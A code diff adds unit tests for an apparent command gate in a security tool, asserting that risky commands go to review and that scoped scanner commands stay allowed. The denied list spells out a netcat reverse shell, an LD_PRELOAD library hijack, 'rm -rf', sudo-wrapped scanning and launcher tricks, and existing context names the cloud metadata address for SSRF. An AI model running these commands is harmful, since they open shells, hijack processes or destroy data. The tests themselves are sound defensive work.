@@ -57,3 +57,23 @@ def test_report_secrets_mask_by_default():
 def test_ssrf_guard_blocks_local_addresses():
     assert not _url_is_public("http://127.0.0.1/admin")
     assert not _url_is_public("http://169.254.169.254/latest/meta-data/")
+
+def test_autonomous_gate_routes_launchers_and_host_mutation_to_review():
+    denied = (
+        "env bash -c 'id'",
+        "timeout 5 nmap 10.0.0.1",
+        "sudo nmap 10.0.0.1",
+        "rm -rf /tmp/example",
+        "find /tmp -type f -exec cat {} ;",
+        "/tmp/nmap -sT 10.0.0.1",
+        "LD_PRELOAD=/tmp/hijack.so nmap 10.0.0.1",
+        "ncat -e /bin/sh 10.0.0.1 4444",
+    )
+    for command in denied:
+        assert is_allowlisted_command(command) is not None, command
+
+
+def test_autonomous_gate_keeps_scoped_scanners_usable():
+    assert is_allowlisted_command("nmap -sT -Pn -p 80 10.0.0.1") is None
+    assert is_allowlisted_command("nuclei -target https://lab.example") is None
+
